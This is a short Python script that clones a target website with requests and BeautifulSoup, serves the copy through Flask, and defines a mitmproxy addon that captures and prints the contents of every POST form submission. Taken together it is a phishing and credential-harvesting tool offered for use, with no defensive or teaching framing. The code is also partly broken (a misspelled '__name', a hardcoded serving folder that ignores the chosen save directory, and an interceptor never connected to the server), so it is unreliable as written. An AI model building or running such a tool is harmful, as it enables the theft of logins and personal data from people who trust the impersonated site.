import requests
from bs4 import BeautifulSoup
from flask import Flask, send_from_directory
import os
import mitmproxy
from mitmproxy import http

app = Flask(__name)

# Function to clone a website
def clone_website(target_url, save_directory):
    response = requests.get(target_url)
    if response.status_code == 200:
        page_content = response.text
        soup = BeautifulSoup(page_content, 'html.parser')
        # Modify links as needed
        # Save the modified content
        if not os.path.exists(save_directory):
            os.makedirs(save_directory)
        with open(os.path.join(save_directory, 'index.html'), 'w', encoding='utf-8') as file:
            file.write(str(soup))

# Intercept and capture form submissions
class FormSubmitInterceptor:
    def request(self, flow: mitmproxy.http.HTTPFlow):
        if flow.request.method == 'POST':
            # Capture form data here
            form_data = flow.request.get_text()
            print("Captured Form Data:")
            print(form_data)

addons = [
    FormSubmitInterceptor()
]

@app.route('/')
def serve_cloned_website():
    return send_from_directory('cloned_website', 'index.html')

def main():
    target_url = input("Enter the target website URL to clone: ")
    save_directory = input("Enter the local directory to save the cloned website: ")

    clone_website(target_url, save_directory)
    app.run()

if __name__ == '__main__':
    main()
